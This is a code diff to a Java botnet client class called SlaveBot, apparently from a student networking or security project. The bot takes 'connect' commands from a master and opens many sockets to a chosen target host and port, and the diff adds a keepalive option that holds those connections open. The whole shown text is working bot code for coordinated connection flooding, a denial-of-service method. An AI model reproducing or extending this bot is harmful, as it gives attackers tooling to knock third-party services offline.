@@ -102,14 +102,29 @@ public class SlaveBot {
                         ipAddr = InetAddress.getByName(tgtName);
                         //tgtPort = Integer.parseInt(splitcmd[3]);
                         tgtPortStr = splitcmd[3];
+
+                        //proj2 : add keepalive option in "connect"
+                        boolean keepAlive=false ;
+
+                        //Commands Types:
                         if (!tgtPortStr.equalsIgnoreCase("all")){
                             tgtPort = Integer.parseInt(splitcmd[3]);
                         }
-                        if (splitcmd.length == 5)
+                        //Proj2 : add keepalive option.
+                        if (splitcmd.length == 5 && (!splitcmd[4].equalsIgnoreCase("keepalive"))) {
                             numConn = Integer.parseInt(splitcmd[4]);
+                        } else {
+                            numConn = 1;
+                        }
 
                         if (cmd.equalsIgnoreCase("connect")) {
-                            addConns(tgtName, ipAddr, tgtPort, numConn);
+
+                            //proj2 : add keepalive option in "connect"
+                            if (message.contains("keepalive")){
+                                keepAlive = true;
+                                System.out.println("Info: Set connection to keepalive!");
+                            }
+                            addConns(tgtName, ipAddr, tgtPort, numConn,keepAlive);
                         }
                         //dis-connect command from master
                         else if (cmd.equalsIgnoreCase("disconnect")) {
@@ -135,9 +150,9 @@ public class SlaveBot {
     } // close method go
 
     /* methode : add target connections per master's "connect" commands.
-     *
+     * proj2 : add "keepalive" option in arguments.
      */
-    public void addConns (String tgtName,InetAddress tgtAddr,int tgtPort,int numConns){
+    public void addConns (String tgtName,InetAddress tgtAddr,int tgtPort,int numConns,boolean keepAlive){
 
         // Creat requierd number of new connections to target
         ArrayList <Socket>  newSockSet = new ArrayList <Socket> () ;
@@ -146,6 +161,11 @@ public class SlaveBot {
                 System.out.println("new socket:"+tgtAddr+" "+tgtPort);
                 Socket sock = new Socket(tgtAddr, tgtPort);
                 newSockSet.add(sock);
+
+                //proj2 : add "keepalive"option in argument.
+                if (keepAlive){
+                    sock.setKeepAlive(true);
+                }
             }
             //Traverse tagets set to check whehther already exised.
             int found = 0;
